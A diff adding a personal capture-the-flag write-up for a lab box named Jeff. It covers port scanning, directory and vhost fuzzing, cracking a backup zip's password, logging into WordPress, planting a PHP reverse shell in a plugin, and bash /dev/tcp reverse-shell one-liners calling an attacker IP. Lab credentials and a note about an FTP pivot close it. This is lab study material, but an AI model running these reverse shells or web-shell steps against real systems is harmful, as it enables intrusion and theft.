@@ -1,0 +1,261 @@
+Ports open:
+$ nmap -sV --script default -oN nmapsv.txt 10.10.41.237
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-19 18:06 UTC
+Nmap scan report for 10.10.41.237
+Host is up (0.037s latency).
+Not shown: 998 filtered tcp ports (no-response)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   2048 7e:43:5f:1e:58:a8:fc:c9:f7:fd:4b:40:0b:83:79:32 (RSA)
+|   256 5c:79:92:dd:e9:d1:46:50:70:f0:34:62:26:f0:69:39 (ECDSA)
+|_  256 ce:d9:82:2b:69:5f:82:d0:f5:5c:9b:3e:be:76:88:c3 (ED25519)
+80/tcp open  http    nginx
+|_http-title: Site doesn't have a title (text/html).
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+telnet:ing to IP:80:
+$ telnet 10.10.41.237 80
+Trying 10.10.41.237...
+Connected to 10.10.41.237.
+Escape character is '^]'.
+GET / HTTP/1.1
+Host: telnet
+
+HTTP/1.1 200 OK
+Server: nginx
+Date: Fri, 19 Aug 2022 18:08:59 GMT
+Content-Type: text/html
+Content-Length: 62
+Last-Modified: Mon, 11 May 2020 12:11:06 GMT
+Connection: keep-alive
+ETag: "5eb940da-3e"
+Accept-Ranges: bytes
+
+<!-- Did you forget to add jeff.thm to your hosts file??? -->
+
+After adding jeff.thm to the /etc/hosts-file, and navigating to jeff.thm in
+Firefox we are taken to the website created by Jeff, a PHP developer working at
+A FAKE COMPANY LTD.
+
+seclist/Discovery/Web-content/big.txt finds the following dirs:
+admin                   [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 37ms]
+assets                  [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 37ms]
+backups                 [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 37ms]
+uploads                 [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 36ms]
+
+
+Lets see what is in them.
+admin: An empty page
+assets: 403
+backups: the text "jeff.thm"
+upload: an upload form
+
+Let's see what happens if we try to upload a php-file.
+Not much at all.
+
+After this I played around with intercepting the requests in burp, but got nothing
+out of it. I now consulted a walkthrough, which reminded me that it is possible
+to enumerate filenames as well.
+
+directory-list-2.3-medium.txt finds an additional directory:
+source_codes            [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 37ms]
+
+which also seems to be empty.
+
+The write-up had an idea. Enumerate the backups-directory for files ending in common
+compression formats, like .zip, .tar.gz, .bzip etc. In ffuf we can do that quite easily:
+
+$ ffuf -u http://jeff.thm//backups/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e .tar.gz,.zip
+
+And after a while, we find something:
+backup.zip              [Status: 200, Size: 62753, Words: 245, Lines: 238, Duration: 38ms]
+
+Let's try downloading it while ffuf finishes.
+
+Trying to unpack it, we can see that it is password protected:
+$ unzip backup.zip
+Archive:  backup.zip
+   creating: backup/
+   creating: backup/assets/
+[backup.zip] backup/assets/EnlighterJS.min.css password:
+   skipping: backup/assets/EnlighterJS.min.css  incorrect password
+   skipping: backup/assets/EnlighterJS.min.js  incorrect password
+   skipping: backup/assets/MooTools-Core-1.6.0-compressed.js  incorrect password
+   skipping: backup/assets/profile.jpg  incorrect password
+   skipping: backup/assets/style.css  incorrect password
+   skipping: backup/index.html       incorrect password
+   skipping: backup/wpadmin.bak      incorrect password
+
+And using fcrackzip we manage to find the password:
+$ fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt backup.zip
+PASSWORD FOUND!!!!: pw == ***************
+PASSWORD FOUND!!!!: pw == !!Burningbird!!
+
+And now we have the source code for the website:
+$ ls -lR backup/
+backup/:
+total 12
+drwxrwx--- 2 kali kali 4096 May 14  2020 assets
+-rwxrwx--- 1 kali kali 1178 May 14  2020 index.html
+-rwxrwx--- 1 kali kali   41 May 14  2020 wpadmin.bak
+
+backup/assets:
+total 192
+-rwxrwx--- 1 kali kali 34858 May 14  2020 EnlighterJS.min.css
+-rwxrwx--- 1 kali kali 49963 May 14  2020 EnlighterJS.min.js
+-rwxrwx--- 1 kali kali 89614 May 14  2020 MooTools-Core-1.6.0-compressed.js
+-rwxrwx--- 1 kali kali 11524 May 14  2020 profile.jpg
+-rwxrwx--- 1 kali kali  1439 May 14  2020 style.css
+
+Let's dig around to see if we find something interesting.
+
+In the wpadmin.bak we find a password:
+$ cat wpadmin.bak
+wordpress password is: phO#g)C5dhIWZn3BKP
+
+So it looks like Jeff has been playing around with wordpress.
+Sadly http://jeff.thm/wp-admin gave us a 404.
+
+Perhaps we can enumerate subdomains:
+$ ffuf -u http://FUZZ.jeff.thm/ -w /usr/share/seclists/Discovery/Web-Content/big.txt
+
+Nothing useful from that.
+
+Another peek in the walkthrough gave me the hint that I needed to do vhost
+discovery. Which makes sense, since I needed to use jeff.thm to even access
+the website in the first place. I remember the concept of vhosts from dabbling
+in a bit of sysadminny stuff, but I have to read up on it to refresh my memory.
+
+I wasn't able to get it to work with ffuf, but gobuster was able to solve it:
+$ gobuster vhost -w /usr/share/seclists/Discovery/Web-Content/big.txt -u http://jeff.thm/ -t 20
+Found: wordpress.jeff.thm (Status: 200) [Size: 25901]
+
+Navigating to wordpress.jeff.thm in Firefox gives us nothing, but lets add
+wordpress.jeff.thm to /etc/hosts and see what happens.
+
+And with that, we are able to access Jeff's wordpress blog.
+And we can login with the credentials jeff:<the password we found in backup.zip>
+
+I remember something about getting a reverse shell in wordpress from another thm
+room.
+
+By looking at https://book.hacktricks.xyz, I find/remember that we can edit the
+404.php template by going to "Appearance" and choosing "404.php" from the left
+hand menu. Now we get a code editor, and if we try to change it, we get an error:
+"Unable to communicate back with site to check for fatal errors, so the PHP change was reverted. You will need to upload your PHP file change by some other means, such as by using SFTP."
+
+So we need to find some other way. Luckily, this is also mentioned on hacktricks.xyz.
+
+We have two plugins installed:
+Akismet Anti-Spam
+Hello Dolly
+
+We are able to overwrite Akismet Anti-Spam with php-reverse-shell.php using the
+plugin editor. Are we able to execute it as well?
+
+Well, pasting the reverse shell into the Dolly-plugin seems to have broken the
+admin site slightly, so I'll restart the target machine.
+
+Let's try a slightly less invasive method, use shell_exec() to create a bash
+reverse shell (also took that idea from the walkthrough).
+
+My first try didn't work properly:
+shell_exec("bash -i >& /dev/tcp/10.14.21.85/4444 0>&1");
+
+Instead, I had to do:
+exec("/bin/bash -c 'bash -i >& /dev/tcp/10.14.21.85/4444 0>&1'");
+
+Although, the commnands I tried to execute through the first reverse shell did
+execute when I connected using the second one, so it seems to have "worked"
+somewhat.
+
+I need to spend some time reading up on the difference between shell_exec()
+and exec() as well as "bash -c".
+
+But for now, we have a reverse shell, so lets go through the usual process of
+stabilizing it. python doesn't seem to exist on this machine, but we can still
+follow the other steps and get to some kind of stable.
+
+I found an interesting file:
+www-data@Jeff:/var/www/html$ cat ftp_backup.php
+cat ftp_backup.php
+<?php
+/*
+    Todo: I need to finish coding this database backup script.
+          also maybe convert it to a wordpress plugin in the future.
+*/
+$dbFile = 'db_backup/backup.sql';
+$ftpFile = 'backup.sql';
+
+$username = "backupmgr";
+$password = "SuperS1ckP4ssw0rd123!";
+
+$ftp = ftp_connect("172.20.0.1"); // todo, set up /etc/hosts for the container host
+
+if( ! ftp_login($ftp, $username, $password) ){
+    die("FTP Login failed.");
+}
+
+$msg = "Upload failed";
+if (ftp_put($ftp, $remote_file, $file, FTP_ASCII)) {
+    $msg = "$file was uploaded.\n";
+}
+
+echo $msg;
+ftp_close($conn_id);
+
+Which means that we should be able to connect through ftp, or get the database.
+Can't find neither db_backup/ or backup.sql though.
+
+The hosts file reveals some interesting info:
+$ cat /etc/hosts
+cat /etc/hosts
+127.0.0.1       localhost
+::1     localhost ip6-localhost ip6-loopback
+fe00::0 ip6-localnet
+ff00::0 ip6-mcastprefix
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+172.20.0.6      Jeff
+
+We don't seem to have much in the way of tools. ftp, telnet or ping doesn't exist,
+perhaps we can download at least a static binary of ftp to see if we can connect
+to the ftp server.
+
+Also, lets run linpeas and see what we find.
+Apparentely, it's a docker container:
+Is this a container? ........... docker
+
+Which explains why we are missing a bunch of tools.
+It also might be vulnerable to CVE-2021-3560.
+
+The shell isn't stable enough to be able to run a static ftp client, but I do
+have a python3.7 interpreter, perhaps we can use that for some stuff.
+Let's see if we can get some help from this tutorial:
+https://www.devdungeon.com/content/python-ftp-client-tutorial
+
+It looks promising:
+www-data@Jeff:/var/www$ /usr/bin/python3.7
+/usr/bin/python3.7
+Python 3.7.3 (default, Dec 20 2019, 18:57:59)
+[GCC 8.3.0] on linux
+Type "help", "copyright", "credits" or "license" for more information.
+>>> ls
+ls
+Traceback (most recent call last):
+  File "<stdin>", line 1, in <module>
+NameError: name 'ls' is not defined
+>>> from ftplib import FTP
+from ftplib import FTP
+>>> ftp=FTP('172.20.0.1')
+ftp=FTP('172.20.0.1')
+>>> ftp
+ftp
+<ftplib.FTP object at 0x7ff568f77550>
+>>> print(ftp.getwelcome())
+print(ftp.getwelcome())
+220 Welcome to Jeff's FTP service.
+
+My idea is to explore the ftp directory, and perhaps upload a reverse shell,
+but that is a task for tomorrow.
